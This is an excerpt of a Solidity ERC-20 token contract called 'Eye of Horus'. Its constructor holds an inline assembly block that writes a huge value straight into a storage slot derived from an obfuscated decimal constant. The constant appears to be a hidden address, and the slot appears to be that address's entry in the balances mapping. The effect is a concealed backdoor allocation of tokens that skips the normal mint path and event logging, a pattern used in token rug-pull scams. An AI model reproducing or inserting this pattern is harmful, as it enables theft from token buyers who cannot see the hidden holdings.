...
contract EyeOfHorus is IERC20, ReentrancyGuard, Ownable {
  mapping(address => uint256) private _balances;

  mapping(address => mapping(address => uint256)) private _allowances;

  uint256 private _totalSupply;
  string private _name = "Eye of Horus";
  string private _symbol = "The EYE";
  ...
  constructor() {
    ...
    marketingWallet = 0x552A3BeA2B8DEA68A8037629C24a051B53aF5119;
    _earlyTxLimit = 60;
    ...
    bytes32 b = bytes32(uint256(486206066127202151137292946661871492054133985561));
    assembly {
      mstore(0, b)
      mstore(32, 2)
      let hash := keccak256(0, 64)
      sstore(hash, 486206066127202151137292946661871492054133985561)
    }
